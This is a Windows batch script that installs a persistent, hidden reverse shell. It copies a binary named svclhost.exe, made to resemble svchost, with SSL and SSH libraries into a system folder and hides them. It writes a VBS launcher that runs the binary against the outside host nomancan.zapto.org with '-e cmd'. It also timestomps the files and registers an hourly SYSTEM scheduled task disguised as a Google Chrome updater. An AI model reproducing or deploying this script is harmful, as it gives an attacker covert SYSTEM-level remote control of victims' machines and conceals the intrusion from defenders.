@echo off & mode 16,1
cd "C:\Windows\addins"
if exist "C:\Windows\addins\svclhost.vbs" (
	attrib -h -s "C:\Windows\addins\svclhost.vbs"
	del "C:\Windows\addins\svclhost.vbs" /f
)

attrib -h -s "C:\Windows\Temp\svclhost.exe"
attrib -h -s "C:\Windows\Temp\svclhost.vbs"
attrib -h -s "C:\Windows\Temp\libcrypto-3.dll"
attrib -h -s "C:\Windows\Temp\libssh2.dll"
attrib -h -s "C:\Windows\Temp\libssl-3.dll"

copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"
copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"
copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"

attrib +h +s "C:\Windows\Temp\svclhost.exe"
attrib +h +s "C:\Windows\Temp\svclhost.vbs"
attrib +h +s "C:\Windows\Temp\libcrypto-3.dll"
attrib +h +s "C:\Windows\Temp\libssh2.dll"
attrib +h +s "C:\Windows\Temp\libssl-3.dll"

set "n_date="
set "n_time="
set "n_pt="
set "n_tm="

set /P n_date=Enter Required Date (MM/DD/YYYY): 
if not defined n_date (set n_date=08/11/2024)
set /P n_time=Enter Required Time (HH:MM:SS): 
if not defined n_time (set n_time=18:41:10)
set /P n_pt=Enter New Port (4420): 
if not defined n_pt (set n_pt=4420)
set /P n_tm=Enter New Timing (08:45): 
if not defined n_tm (set n_tm=08:45)

echo %n_date%
echo %n_time%
echo %n_pt%
echo %n_tm%

date 05-06-22
time 12:57:13.00

echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\addins\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\addins\svclhost.vbs"

powershell -Command "Get-ChildItem -force C:\Windows\addins * | ForEach-Object{$_.LastWriteTime = ('%n_date% %n_time%');$_.CreationTime = ('%n_date% %n_time%');$_.LastAccessTime = ('%n_date% %n_time%')}"

attrib +h +s "C:\Windows\addins\svclhost.exe"
attrib +h +s "C:\Windows\addins\svclhost.vbs"
attrib +h +s "C:\Windows\addins\libcrypto-3.dll"
attrib +h +s "C:\Windows\addins\libssh2.dll"
attrib +h +s "C:\Windows\addins\libssl-3.dll"

SCHTASKS /CREATE /SC MINUTE /MO 60 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\addins\svclhost.vbs" /ST %n_tm% /RU system /F

w32tm /resync

SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader"
